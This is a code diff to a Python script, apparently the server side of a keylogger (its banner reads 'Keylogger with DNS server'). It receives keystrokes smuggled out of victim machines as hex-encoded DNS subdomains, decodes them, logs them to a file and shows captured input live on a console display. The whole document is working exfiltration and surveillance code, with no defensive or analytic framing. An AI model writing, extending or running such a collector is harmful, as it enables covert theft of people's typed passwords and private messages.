@@ -4,12 +4,20 @@
 import socket
 from dnslib import DNSRecord, QTYPE, RR, A
 import time
+import os
 
 ###############################################################
 # Vars. Global
 ###############################################################
 _DNS_ADDR = ('0.0.0.0', 9953)
 _FAKE_DOMAIN = '.example.com.'
+_LAST_REQUEST = []
+_COR = {
+        'limpa':'\033[m',
+        'red':'\033[31m',
+        'green':'\033[32m',
+        'yellow':'\033[33m'
+    }
 ###############################################################
 # Classes e Funções
 ###############################################################
@@ -32,43 +40,53 @@ def treatments(data):
         '^u': 'û',
         '~a': 'ã',
         '~o': 'õ',
-        '¥': '[CAPS]',
-        'ß': '[NUMLOCK]',
-        '┤': '[WIN]',
-        '¤': '[TAB]',
-        '©': '[CTRL_L]',
-        'Þ': '[SHIFT]',
-        '¿': 'NONE'
     }
 
     for key, value in replacements.items():
         data = data.replace(key, value)
-        print(data)
+        #print(data)
 
     return data
 
 def write_on_file(path, data):
-    data = treatments(data)
-    print (data)
+    #data = treatments(data)
+    #print (data)
     with open(path, 'a') as file:
         file.write(data)
         file.close()
+
+def menu(addr=None, data=None):
+    global _LAST_REQUEST
+
+    if len(_LAST_REQUEST) <= 10 and data != None:
+        _LAST_REQUEST.append(f'{addr} | {data}\n')
+    elif len(_LAST_REQUEST) >= 10:
+        _LAST_REQUEST.pop(0)
+        _LAST_REQUEST.append(f'{addr} | {data}\n')
+
+    request_string = ''.join(i for i in _LAST_REQUEST)
+
+    os.system('cls')
+    print(f'''
+{_COR['red']}╦╔═{_COR['limpa']}┌─┐┬ ┬{_COR['red']}╦  {_COR['limpa']}┌─┐┌─┐┌─┐┌─┐┬─┐          
+{_COR['red']}╠╩╗{_COR['limpa']}├┤ └┬┘{_COR['red']}║  {_COR['limpa']}│ ││ ┬│ ┬├┤ ├┬┘          
+{_COR['red']}╩ ╩{_COR['limpa']}└─┘ ┴ {_COR['red']}╩═╝{_COR['limpa']}└─┘└─┘└─┘└─┘┴└─          
+┬ ┬┬┌┬┐┬ ┬  {_COR['red']}╔╦╗╔╗╔╔═╗{_COR['limpa']}┌─┐┬─┐┬  ┬┌─┐┬─┐
+││││ │ ├─┤   {_COR['red']}║║║║║╚═╗{_COR['limpa']}├┤ ├┬┘└┐┌┘├┤ ├┬┘
+└┴┘┴ ┴ ┴ ┴  {_COR['red']}═╩╝╝╚╝╚═╝{_COR['limpa']}└─┘┴└─ └┘ └─┘┴└─    
+[Aceitando requisições na porta {_COR['green']}9953{_COR['limpa']}]
+
+[Requisições em tempo real]
+{request_string}
+''')
 
 
 def start_dns_server():
     # Cria um socket para ouvir requisições DNS
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.bind(_DNS_ADDR)
-    print('''
-╦╔═┌─┐┬ ┬╦  ┌─┐┌─┐┌─┐┌─┐┬─┐          
-╠╩╗├┤ └┬┘║  │ ││ ┬│ ┬├┤ ├┬┘          
-╩ ╩└─┘ ┴ ╩═╝└─┘└─┘└─┘└─┘┴└─          
-┬ ┬┬┌┬┐┬ ┬  ╔╦╗╔╗╔╔═╗┌─┐┬─┐┬  ┬┌─┐┬─┐
-││││ │ ├─┤   ║║║║║╚═╗├┤ ├┬┘└┐┌┘├┤ ├┬┘
-└┴┘┴ ┴ ┴ ┴  ═╩╝╝╚╝╚═╝└─┘┴└─ └┘ └─┘┴└─      
-''')
-    print('Servidor DNS ouvindo na porta 9953...')
-    print('<Aguardando requisições>')
+    
+    menu()
     
     while True:
         try:
@@ -80,12 +98,13 @@ def start_dns_server():
             # Lê a requisição DNS
             request = DNSRecord.parse(data)
             data = str(request.q.qname)
-            print(f'{addr} | {data}')
             data = data.replace(_FAKE_DOMAIN, '')
             
             # Decodifica os dados do domínio
             data = ''.join([chr(int(data[i:i+2], 16)) for i in range(0, len(data), 2)])
             #print(f"Dados exfiltrados: {str(data)}")
+            data = treatments(data)
+            menu(addr, data)
             write_on_file(path, data)            
             
             # Criando um objeto DNSRecord para a resposta
